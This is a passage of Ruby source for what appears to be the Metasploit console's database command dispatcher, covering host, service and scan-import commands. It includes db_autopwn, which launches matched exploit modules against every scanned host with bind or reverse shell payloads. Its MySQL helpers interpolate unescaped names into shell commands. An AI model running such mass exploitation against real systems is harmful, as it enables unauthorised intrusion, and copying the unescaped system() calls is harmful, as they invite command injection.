
require 'rexml/document'
require 'rex/parser/nmap_xml'

module Msf
module Ui
module Console
module CommandDispatcher
class Db

		require 'tempfile'

		include Msf::Ui::Console::CommandDispatcher

		#
		# Constants
		#

		PWN_SHOW = 2**0
		PWN_XREF = 2**1
		PWN_PORT = 2**2
		PWN_EXPL = 2**3
		PWN_SING = 2**4
		PWN_SLNT = 2**5
		PWN_VERB = 2**6

		#
		# The dispatcher's name.
		#
		def name
			"Database Backend"
		end

		#
		# Returns the hash of commands supported by this dispatcher.
		#
		def commands
			base = {
				"db_driver"     => "Specify a database driver",
				"db_connect"    => "Connect to an existing database",
				"db_disconnect" => "Disconnect from the current database instance",
				"db_create"     => "Create a brand new database",
				"db_destroy"    => "Drop an existing database",
			}

			more = {
				"db_hosts"      => "List all hosts in the database",
				"db_services"   => "List all services in the database",
				"db_vulns"      => "List all vulnerabilities in the database",
				"db_notes"      => "List all notes in the database",
				"db_add_host"   => "Add one or more hosts to the database",
				"db_add_port"   => "Add a port to host",
				"db_add_note"   => "Add a note to host",
				"db_del_host"   => "Delete one or more hosts from the database",
				"db_del_port"   => "Delete one port from the database",
				"db_autopwn"    => "Automatically exploit everything",
				"db_import_amap_mlog"   => "Import a THC-Amap scan results file (-o -m)",
				"db_import_nessus_nbe"  => "Import a Nessus scan result file (NBE)",
				"db_import_nessus_xml"	=> "Import a Nessus scan result file (NESSUS)",
				"db_import_nmap_xml"    => "Import a Nmap scan results file (-oX)",
				"db_nmap"               => "Executes nmap and records the output automatically",
			}

			framework.db.active ? base.merge(more) : base
		end

 		def cmd_db_hosts(*args)
			onlyup = false
			hosts = nil
			while (arg = args.shift)
				case arg
				when '-u','--up'
					onlyup = true
				when '-a'
					hostlist = args.shift
					if(!hostlist)
					print_status("Invalid host list")
						return
					end
					hosts = hostlist.strip().split(",")
				when '-h','--help'
					print_status("Usage: db_hosts [-h|--help] [-u|--up] [-a <addr1,addr2>]")
					print_line("  -u,--up           Only show hosts which are up")
					print_line("  -a <addr1,addr2>  Search for a list of addresses")
					print_line("  -h,--help         Show this help information")
					return
				end
			end

 			framework.db.each_host do |host|
				next if(onlyup and host.state == "down")
				next if(hosts != nil and hosts.index(host.address) == nil)
 				print_status("Time: #{host.created} Host: #{host.address} Status: #{host.state} OS: #{host.os_name} #{host.os_flavor}")
 			end
 		end

		def cmd_db_services(*args)
			onlyup = false
			hosts = nil
			ports = nil
			proto = nil
			name = nil
			while (arg = args.shift)
				case arg
				when '-u','--up'
					onlyup = true
				when '-a'
					hostlist = args.shift
					if(!hostlist)
						print_status("Invalid host list")
						return
					end
					hosts = hostlist.strip().split(",")
				when '-p'
					portlist = args.shift
					if(!portlist)
						print_status("Invalid port list")
						return
					end
					ports = portlist.strip().split(",")
				when '-r'
					proto = args.shift
					if(proto == nil)
						print_status("Invalid protocol")
						return
					end
					proto = proto.strip()
				when '-n'
					namelist = args.shift
					if(!namelist)
						print_status("Invalid name list")
						return
					end
					names = namelist.strip().split(",")

				when '-h','--help'
					print_status("Usage: db_services [-h|--help] [-u|--up] [-a <addr1,addr2>] [-r <proto>] [-p <port1,port2>] [-n <name1,name2>]")
					print_line("  -u,--up           Only show services which are up")
					print_line("  -r <protocol>     Only show [tcp|udp] services")
					print_line("  -a <addr1,addr2>  Search for a list of addresses")
					print_line("  -p <port1,port2>  Search for a list of ports")
					print_line("  -n <name1,name2>  Search for a list of service names")
					print_line("  -h,--help         Show this help information")
					return
				end
			end
 			framework.db.each_service do |service|
				next if(onlyup and !(service.state == "open" || service.state == "up"))
				next if(proto and service.proto != proto)
				next if(hosts and hosts.index(service.host.address) == nil)
				next if(ports and ports.index(service.port.to_s) == nil)
				next if(names and names.index(service.name) == nil)
 				print_status("Time: #{service.created} Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state} name=#{service.name}")
 			end
 		end


		def cmd_db_vulns(*args)
			framework.db.each_vuln do |vuln|
				reflist = vuln.refs.map { |r| r.name }
				if(vuln.service)
					print_status("Time: #{vuln.created} Vuln: host=#{vuln.host.address} port=#{vuln.service.port} proto=#{vuln.service.proto} name=#{vuln.name} refs=#{reflist.join(',')}")
				else
					print_status("Time: #{vuln.created} Vuln: host=#{vuln.host.address} name=#{vuln.name} refs=#{reflist.join(',')}")
				end
			end
		end

 		def cmd_db_notes(*args)
			hosts = nil
			types = nil
			while (arg = args.shift)
				case arg
				when '-a'
					hostlist = args.shift
					if(!hostlist)
						print_status("Invalid host list")
						return
					end
					hosts = hostlist.strip().split(",")
				when '-t'
					typelist = args.shift
					if(!typelist)
						print_status("Invalid host list")
						return
					end
					types = typelist.strip().split(",")
				when '-h','--help'
					print_status("Usage: db_notes [-h|--help] [-a <addr1,addr2>] [-t <type1,type2>]")
					print_line("  -a <addr1,addr2>  Search for a list of addresses")
					print_line("  -t <type1,type2>  Search for a list of types")
					print_line("  -h,--help         Show this help information")
					return
				end

			end
 			framework.db.each_note do |note|
				next if(hosts and hosts.index(note.host.address) == nil)
				next if(types and types.index(note.ntype) == nil)
 				print_status("Time: #{note.created} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data}")
 			end
 		end

		def cmd_db_add_host(*args)
			print_status("Adding #{args.length} hosts...")
			args.each do |address|
				host = framework.db.get_host(nil, address)
				print_status("Time: #{host.created} Host: host=#{host.address}")
			end
		end

		def cmd_db_add_port(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_add_port [host] [port] [proto]")
				return
			end

			host = framework.db.get_host(nil, args[0])
			return if not host

			service = framework.db.get_service(nil, host, args[2].downcase, args[1].to_i)
			return if not service

			print_status("Time: #{service.created} Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state}")
		end

		def cmd_db_del_port(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_del_port [host] [port] [proto]")
				return
			end

			if framework.db.del_service(nil, args[0], args[2].downcase, args[1].to_i)
				print_status("Service: host=#{args[0]} port=#{args[1].to_i} proto=#{args[2].downcase} deleted")
			end
		end

		def cmd_db_add_note(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_add_note [host] [type] [note]")
				return
			end

			naddr = args.shift
			ntype = args.shift
			ndata = args.join(" ")

			host = framework.db.get_host(nil, naddr)
			return if not host

			note = framework.db.get_note(nil, host, ntype, ndata)
			return if not note

			print_status("Time: #{note.created} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data}")
		end


		def cmd_db_del_host(*args)
			args.each do |address|
				if framework.db.del_host(nil, address)
					print_status("Host #{address} deleted")
				end
			end
		end

		#
		# A shotgun approach to network-wide exploitation
		#
		def cmd_db_autopwn(*args)

			stamp = Time.now.to_f
			vcnt  = 0
			rcnt  = 0
			mode  = 0
			code  = :bind
			mjob  = 5
			regx  = nil

			port_inc = []
			port_exc = []

			targ_inc = []
			targ_exc = []

			args.push("-h") if args.length == 0

			while (arg = args.shift)
				case arg
				when '-t'
					mode |= PWN_SHOW
				when '-x'
					mode |= PWN_XREF
				when '-p'
					mode |= PWN_PORT
				when '-e'
					mode |= PWN_EXPL
				when '-s'
					mode |= PWN_SING
				when '-q'
					mode |= PWN_SLNT
				when '-v'
					mode |= PWN_VERB
				when '-j'
					mjob = args.shift.to_i
				when '-r'
					code = :conn
				when '-b'
					code = :bind
				when '-I'
					targ_inc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
				when '-X'
					targ_exc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
				when '-PI'
					port_inc = Rex::Socket.portspec_crack(args.shift)
				when '-PX'
					port_exc = Rex::Socket.portspec_crack(args.shift)
				when '-m'
					regx = args.shift
				when '-h','--help'
					print_status("Usage: db_autopwn [options]")
					print_line("\t-h          Display this help text")
					print_line("\t-t          Show all matching exploit modules")
					print_line("\t-x          Select modules based on vulnerability references")
					print_line("\t-p          Select modules based on open ports")
					print_line("\t-e          Launch exploits against all matched targets")
#					print_line("\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)")
					print_line("\t-r          Use a reverse connect shell")
					print_line("\t-b          Use a bind shell on a random port (default)")
					print_line("\t-q          Disable exploit module output")
					print_line("\t-I  [range] Only exploit hosts inside this range")
					print_line("\t-X  [range] Always exclude hosts inside this range")
					print_line("\t-PI [range] Only exploit hosts with these ports open")
					print_line("\t-PX [range] Always exclude hosts with these ports open")
					print_line("\t-m  [regex] Only run modules whose name matches the regex")
					print_line("")
					return
				end
			end

			minrank = framework.datastore['MinimumRank'] || ''
			if not RankingName.values.include?(minrank)
				print_error("MinimumRank invalid, ignoring")
				wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
				minrank = nil
			else
				minrank = RankingName.invert[minrank]
			end
			p minrank
			

			# Default to quiet mode
			if (mode & PWN_VERB == 0)
				mode |= PWN_SLNT
			end

			matches    = {}
			refmatches = {}

			[ [framework.exploits, 'exploit' ], [ framework.auxiliary, 'auxiliary' ] ].each do |mtype|
				# Scan all exploit modules for matching references
				mtype[0].each_module do |n,m|
					e = m.new
					next if minrank and minrank > e.rank

					#
					# Match based on vulnerability references
					#
					if (mode & PWN_XREF != 0)
						e.references.each do |r|
							rcnt += 1

							# Skip URL references for now (false positives)
							next if r.ctx_id == 'URL'

							ref_name = r.ctx_id + '-' + r.ctx_val
							ref = framework.db.has_ref?(ref_name)

							if (ref)
								ref.vulns.each do |vuln|
									vcnt  += 1
									serv  = vuln.service

									xport = xprot = nil

									if(serv and serv.host)
										xport = serv.port
										xprot = serv.proto
									end

									xhost = vuln.host.address
									next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
									next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))

									if(xport)
										next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
										next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
									else
										if(e.datastore['RPORT'])
											next if (port_inc.length > 0 and not port_inc.include?(e.datastore['RPORT'].to_i))
											next if (port_exc.length > 0 and port_exc.include?(e.datastore['RPORT'].to_i))
										end
									end

									next if (regx and e.fullname !~ /#{regx}/)

									e.datastore['RPORT'] = xport if xport
									e.datastore['RHOST'] = xhost
									next if not e.autofilter()

									matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
									refmatches[[xport,xprot,xhost,mtype[1]+'/'+n]] ||= []
									refmatches[[xport,xprot,xhost,mtype[1]+'/'+n]] << ref_name
								end
							end
						end
					end

					#
					# Match based on ports alone
					#
					if (mode & PWN_PORT != 0)
						rports = {}
						rservs = {}

						if(e.datastore['RPORT'])
							rports[e.datastore['RPORT'].to_s] = true
						end

						if(e.respond_to?('autofilter_ports'))
							e.autofilter_ports.each do |rport|
								rports[rport.to_s] = true
							end
						end

						if(e.respond_to?('autofilter_services'))
							e.autofilter_services.each do |serv|
								rservs[serv] = true
							end
						end

						framework.db.services.each do |serv|
							next if not serv.host
							next if (serv.state != "open" && serv.state != "up")

							# Match port numbers
							rports.keys.sort.each do |rport|
								next if serv.port.to_i != rport.to_i
								xport = serv.port
								xprot = serv.proto
								xhost = serv.host.address
								next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
								next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))

								next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
								next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
								next if (regx and e.fullname !~ /#{regx}/)

								e.datastore['RPORT'] = xport if xport
								e.datastore['RHOST'] = xhost

								begin
									next if not e.autofilter()
								rescue ::Interrupt
									raise $!
								rescue ::Exception
									next
								end

								matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
							end

							# Match service names
							rservs.keys.sort.each do |rserv|
								next if serv.name.to_s != rserv
								xport = serv.port
								xprot = serv.proto
								xhost = serv.host.address
								next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
								next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))

								next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
								next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
								next if (regx and e.fullname !~ /#{regx}/)
								matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
							end
						end
					end
				end
			end


			if (mode & PWN_SHOW != 0)
				print_status("Analysis completed in #{(Time.now.to_f - stamp).to_i} seconds (#{vcnt} vulns / #{rcnt} refs)")
				print_status("")
				print_status("=" * 80)
				print_status(" " * 28 + "Matching Exploit Modules")
				print_status("=" * 80)

				matches.each_key do |xref|
					mod = nil
					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					if (mode & PWN_SHOW != 0)
						tport = xref[0] || mod.datastore['RPORT']
						if(refmatches[xref])
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (#{refmatches[xref].join(", ")})")
						else
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (port match)")
						end
					end

				end
				print_status("=" * 80)
				print_status("")
				print_status("")
			end


			idx = 0
			matches.each_key do |xref|

				idx += 1

				begin
					mod = nil

					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					#
					# The code is just a proof-of-concept and will be expanded in the future
					#
					if (mode & PWN_EXPL != 0)

						mod.datastore['RHOST'] = xref[2]

						if(xref[0])
							mod.datastore['RPORT'] = xref[0].to_s
						end

						if (code == :bind)
							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/bind_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
							end
						end

						if (code == :conn)
							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s

							if (mod.datastore['LHOST'] == '127.0.0.1')
								print_status("Failed to determine listener address for target #{xref[2]}...")
								next
							end

							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
							end
						end


						if(framework.jobs.keys.length >= mjob)
							print_status("Job limit reached, waiting on modules to finish...")
							while(framework.jobs.keys.length >= mjob)
								select(nil, nil, nil, 0.25)
							end
						end

						print_status("(#{idx}/#{matches.length} [#{framework.sessions.length} sessions]): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore['RPORT']}...")

						begin
							inp = (mode & PWN_SLNT != 0) ? nil : driver.input
							out = (mode & PWN_SLNT != 0) ? nil : driver.output

							case mod.type
							when MODULE_EXPLOIT
								session = mod.exploit_simple(
									'Payload'        => mod.datastore['PAYLOAD'],
									'LocalInput'     => inp,
									'LocalOutput'    => out,
									'RunAsJob'       => true)
							when MODULE_AUX
								session = mod.run_simple(
									'LocalInput'     => inp,
									'LocalOutput'    => out,
									'RunAsJob'       => true)
							end
						rescue ::Interrupt
							raise $!
						rescue ::Exception
							print_status(" >> autopwn exception during launch from #{xref[3]}: #{$!} ")
						end
					end

				rescue ::Interrupt
					raise $!
				rescue ::Exception
					print_status(" >> autopwn exception from #{xref[3]}: #{$!} #{$!.backtrace}")
				end
			end


			while(framework.jobs.keys.length > 0)
				print_status("(#{matches.length}/#{matches.length} [#{framework.sessions.length} sessions]): Waiting on #{framework.jobs.length} launched modules to finish execution...")
				select(nil, nil, nil, 5.0)
			end

			if (mode & PWN_SHOW != 0 and mode & PWN_EXPL != 0)
				print_status("The autopwn command has completed with #{framework.sessions.length} sessions")
				if(framework.sessions.length > 0)
					print_status("Enter sessions -i [ID] to interact with a given session ID")
					print_status("")
					print_status("=" * 80)
					driver.run_single("sessions -l -v")
					print_status("=" * 80)
				end
			end
			print_line("")
		# EOM
		end

		#
		# This holds all of the shared parsing/handling used by the
		# Nessus NBE and NESSUS methods
		#
		def handle_nessus(addr, port, nasl, data)
			p = port.match(/^([^\(]+)\((\d+)\/([^\)]+)\)/)
			return if not p

			host = framework.db.get_host(nil, addr)
			return if not host

			if host.state != Msf::HostState::Alive
				framework.db.report_host_state(self, addr, Msf::HostState::Alive)
			end

			service = framework.db.get_service(nil, host, p[3].downcase, p[2].to_i)
			name = p[1].strip
			if name != "unknown"
				service.name = name
				service.save
			end

			return if not nasl

			data.gsub!("\\n", "\n")

			refs = {}

			if (data =~ /^CVE : (.*)$/)
				$1.gsub(/C(VE|AN)\-/, '').split(',').map { |r| r.strip }.each do |r|
					refs[ 'CVE-' + r ] = true
				end
			end

			if (data =~ /^BID : (.*)$/)
				$1.split(',').map { |r| r.strip }.each do |r|
					refs[ 'BID-' + r ] = true
				end
			end

			if (data =~ /^Other references : (.*)$/)
				$1.split(',').map { |r| r.strip }.each do |r|
					ref_id, ref_val = r.split(':')
					ref_val ? refs[ ref_id + '-' + ref_val ] = true : refs[ ref_id ] = true
				end
			end

			nss = 'NSS-' + nasl.to_s

			vuln = framework.db.get_vuln(nil, host, service, nss, data)

			rids = []
			refs.keys.each do |r|
				rids << framework.db.get_ref(nil, r)
			end

			vuln.refs << (rids - vuln.refs)
		end

		#
		# Import Nessus NBE files
		#
		def cmd_db_import_nessus_nbe(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nessus_nbe [nessus.nbe]")
				return
			end

			if (not File.readable?(args[0]))
				print_status("Could not read the NBE file")
				return
			end

			fd = File.open(args[0], 'r')
			fd.each_line do |line|
				r = line.split('|')
				next if r[0] != 'results'
				addr = r[2]
				port = r[3]
				nasl = r[4]
				data = r[6]

				handle_nessus(addr, port, nasl, data)
			end
			fd.close
		end

		#
		# Import Nessus NESSUS files
		#
		def cmd_db_import_nessus_xml(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nessus_xml [nessus.nessus]")
				return
			end

			if (not File.readable?(args[0]))
				print_status("Could not read the NESSUS file")
				return
			end

			fd = File.open(args[0], 'r')
			data = fd.read
			fd.close

			doc = REXML::Document.new(data)
			doc.elements.each('/NessusClientData/Report/ReportHost') do |host|
				addr = host.elements['HostName'].text

				host.elements.each('ReportItem') do |item|
					nasl = item.elements['pluginID'].text
					port = item.elements['port'].text
					data = item.elements['data'].text

					handle_nessus(addr, port, nasl, data)
				end
			end
		end

		#
		# Import Nmap data from a file
		#
		def cmd_db_import_nmap_xml(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nmap_xml [nmap.xml]")
				return
			end

			load_nmap_xml(args[0])
		end

		#
		# Import Nmap data from a file
		#
		def cmd_db_nmap(*args)
			if (args.length == 0)
				print_status("Usage: db_nmap [nmap options]")
				return
			end

			nmap =
				Rex::FileUtils.find_full_path("nmap") ||
				Rex::FileUtils.find_full_path("nmap.exe")

			if(not nmap)
				print_error("The nmap executable could not be found")
				return
			end

			fd = Tempfile.new('dbnmap')
			fo = Tempfile.new('dbnmap')

			# When executing native Nmap in Cygwin, expand the Cygwin path to a Win32 path
			if(Rex::Compat.is_cygwin and nmap =~ /cygdrive/)
				# Custom function needed because cygpath breaks on 8.3 dirs
				tout = Rex::Compat.cygwin_to_win32(fd.path)
				fout = Rex::Compat.cygwin_to_win32(fo.path)
				args.push('-oX', tout)
				args.push('-oN', fout)
			else
				args.push('-oX', fd.path)
				args.push('-oN', fo.path)
			end
			system([nmap, "nmap"], *args)

			# Until we hide stdout above, this is pointless
			# fo.each_line do |line|
			#	print_status("NMAP: #{line.strip}")
			# end

			::File.unlink(fo.path)
			load_nmap_xml(fd.path)
		end


		#
		# Process Nmap XML data
		#
		def load_nmap_xml(filename)
			if (not File.readable?(filename) or File.size(filename) < 1)
				print_status("Could not read the XML file")
				return
			end

			# Use a stream parser instead of a tree parser so we can deal with
			# huge results files without running out of memory.
			parser = Rex::Parser::NmapXMLStreamParser.new

			# Whenever the parser pulls a host out of the nmap results, store
			# it, along with any associated services, in the database.
			parser.on_found_host = Proc.new { |h|
				if (h["addrs"].has_key?("ipv4"))
					addr = h["addrs"]["ipv4"]
				elsif (h.has_key?("ipv6"))
					addr = h["addrs"]["ipv6"]
				else
					# Don't care about addresses other than IP
					return
				end
				host = framework.db.get_host(nil, addr)
				status = (h["status"] == "up" ? Msf::HostState::Alive : Msf::HostState::Dead)
				framework.db.report_host_state(self, addr, status)

				# Put all the ports, regardless of state, into the db.
				h["ports"].each { |p|
					service = framework.db.get_service(nil, host, p["protocol"].downcase, p["portid"].to_i)
					service.state = p["state"]
					if p["name"] != "unknown"
						service.name = p["name"]
					end
					service.save
				}
			}

			REXML::Document.parse_stream(File.new(filename), parser)
		end

		#
		# Import from a THC-Amap machine-readable log file
		#
		def cmd_db_import_amap_mlog(*args)
			if args.length == 0
				print_status("Usage: db_import_amap_mlog [logfile]")
				return
			end

			if not File.readable?(args[0])
				print_error("Could not read the log file")
				return
			end

			fd = File.open(args[0], 'r')

			fd.each_line do |line|
				line.sub!(/#.*/, "")

				r = line.split(':')
				next if r.length < 6

				addr   = r[0]
				port   = r[1].to_i
				proto  = r[2].downcase
				status = r[3]
				name   = r[5]

				next if status != "open"

				host = framework.db.get_host(nil, addr)
				next if not host

				if host.state != Msf::HostState::Alive
					framework.db.report_host_state(self, addr, Msf::HostState::Alive)
				end

				service = framework.db.get_service(nil, host, proto, port)
				if not service.name and name != "unidentified"
					service.name = name
					service.save
				end
			end

			fd.close
		end

		#
		# Determine if an IP address is inside a given range
		#
		def range_include?(ranges, addr)

			ranges.each do |sets|
				sets.split(',').each do |set|
					rng = set.split('-').map{ |c| Rex::Socket::addr_atoi(c) }
					tst = Rex::Socket::addr_atoi(addr)
					if (not rng[1])
						return tst == rng[0]
					elsif (tst >= rng[0] and tst <= rng[1])
						return true
					end
				end
			end

			false
		end


		#
		# Database management
		#

		def db_check_driver
			if(not framework.db.driver)
				print_error("No database driver has been specified")
				return false
			end
			true
		end

		def cmd_db_driver(*args)

			if(args[0])
				if(args[0] == "-h" || args[0] == "--help")
					print_status("Usage: db_driver [driver-name]")
					return
				end

				if(framework.db.drivers.include?(args[0]))
					framework.db.driver = args[0]
					print_status("Using database driver #{args[0]}")
				else
					print_error("Invalid driver specified")
				end
				return
			end

			if(framework.db.driver)
				print_status("   Active Driver: #{framework.db.driver}")
			else
				print_status("No Active Driver")
			end
			print_status("       Available: #{framework.db.drivers.join(", ")}")
			print_line("")

			if ! framework.db.drivers.include?('sqlite3')
				print_status("    DB Support: Enable the sqlite3 driver with the following command:")
				print_status("                $ gem install sqlite3-ruby")
				print_line("")
			end

			if ! framework.db.drivers.include?('mysql')
				print_status("    DB Support: Enable the mysql driver with the following command:")
				print_status("                $ gem install mysql")
				print_line("")
			end

			if ! framework.db.drivers.include?('postgresql')
				print_status("    DB Support: Enable the postgresql driver with the following command:")
				print_status("                $ gem install postgres-pr")
				print_line("")
			end
		end

		def cmd_db_driver_tabs(str, words)
			return framework.db.drivers
		end

		def cmd_db_create(*args)
			return if not db_check_driver
			meth = "db_create_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_destroy(*args)
			return if not db_check_driver

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_destroy")
				return
			end

			meth = "db_destroy_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_connect(*args)
			return if not db_check_driver
			meth = "db_connect_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_disconnect(*args)
			return if not db_check_driver

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_disconnect")
				return
			end

			meth = "db_disconnect_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end


		def db_find_tools(tools)
			found   = true
			missed  = []
			tools.each do |name|
				if(! Rex::FileUtils.find_full_path(name))
					missed << name
				end
			end
			if(not missed.empty?)
				print_error("This database command requires the following tools to be installed: #{missed.join(", ")}")
				return
			end
			true
		end
		
		#
		# Database management: SQLite3
		#

		#
		# Disconnect from the current SQLite3 instance
		#
		def db_disconnect_sqlite3(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing SQLite database
		#
		def db_connect_sqlite3(*args)

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_connect [database-file-path]")
				return
			end

			info = db_parse_db_uri_sqlite3(args[0])
			opts = { 'adapter' => 'sqlite3' }

			opts['dbfile'] = info[:path]

			if (not ::File.exists?(opts['dbfile']))
				print_error("The specified database does not exist")
				return
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			print_status("Successfully connected to the database")
			print_status("File: #{opts['dbfile']}")
		end

		#
		# Create a new SQLite database instance
		#
		def db_create_sqlite3(*args)
			cmd_db_disconnect()

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_create [database-file-path]")
				return
			end

			info = db_parse_db_uri_sqlite3(args[0])
			opts = { 'adapter' => 'sqlite3' }

			opts['dbfile'] = info[:path]

			if (::File.exists?(opts['dbfile']))
				print_status("The specified database already exists, connecting")
			else
				print_status("Creating a new database instance...")
				require_library_or_gem('sqlite3')
			end
			
			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
			
			if (not framework.db.migrate)
				raise RuntimeError.new("Failed to create database schema: #{framework.db.error}")
			end

			print_status("Successfully connected to the database")

			print_status("File: #{opts['dbfile']}")
		end

		#
		# Drop an existing database
		#
		def db_destroy_sqlite3(*args)
			cmd_db_disconnect()
			info = db_parse_db_uri_sqlite3(args[0])
			begin
				print_status("Deleting #{info[:path]}...")
				File.unlink(info[:path])
			rescue Errno::ENOENT
				print_error("The specified database does not exist")
			end
		end

		def db_parse_db_uri_sqlite3(path)
			res = {}
			res[:path] = path || ::File.join(Msf::Config.config_directory, 'sqlite3.db')
			res
		end

		#
		# Database management: MySQL
		#

		#
		# Disconnect from the current MySQL instance
		#
		def db_disconnect_mysql(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing MySQL database
		#
		def db_connect_mysql(*args)
			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_connect <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_connect user@metasploit3")
				print_status("       db_connect user:pass@192.168.0.2/metasploit3")
				print_status("       db_connect user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			opts['host'] ||= 'localhost'

			# This is an ugly hack for a broken MySQL adapter:
			# 	http://dev.rubyonrails.org/ticket/3338
			if (opts['host'].strip.downcase == 'localhost')
				opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		#
		# Create a new MySQL database instance
		#
		def db_create_mysql(*args)
			cmd_db_disconnect()

			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_create <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_create user@metasploit3")
				print_status("       db_create user:pass@192.168.0.2/metasploit3")
				print_status("       db_create user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			return if ! db_find_tools(%W{mysqladmin mysql})

			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }

			argv = []

			if (info[:user])
				opts['username'] = info[:user]
				argv.push('-u')
				argv.push(info[:user])
			end

			if (info[:pass])
				argv.push('--password=' + info[:pass])
				opts['password'] = info[:pass]
			end

			if (info[:host])
				opts['host'] = info[:host]
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				opts['port'] = info[:port]
				argv.push('-P')
				argv.push(info[:port])

				# This is an ugly hack for a broken MySQL adapter:
				# 	http://dev.rubyonrails.org/ticket/3338
				if (opts['host'].strip.downcase == 'localhost')
					opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
				end
			end

			argv.push('-f')

			opts['database'] = info[:name]

			cargs = argv.map{|c| "'#{c}' "}.join

			system("mysqladmin #{cargs} drop #{info[:name]} >/dev/null 2>&1")
			system("mysqladmin #{cargs} create #{info[:name]}")
			
			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			if (not framework.db.migrate)
				raise RuntimeError.new("Failed to create database schema: #{framework.db.error}")
			end

			print_status("Database creation complete (check for errors)")
		end

		#
		# Drop an existing database
		#
		def db_destroy_mysql(*args)

			cmd_db_disconnect()

			return if ! db_find_tools(%W{mysqladmin})

			info = db_parse_db_uri_mysql(args[0])
			argv = []

			if (info[:user])
				argv.push('-u')
				argv.push(info[:user])
			end

			if (info[:pass])
				argv.push('--password=' + info[:pass])
			end

			if (info[:host])
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				argv.push('-P')
				argv.push(info[:port])
			end

			argv.push("-f")

			cargs = argv.map{|c| "'#{c}' "}.join
			system("mysqladmin -f #{cargs} drop #{info[:name]}")
		end

		def db_parse_db_uri_mysql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
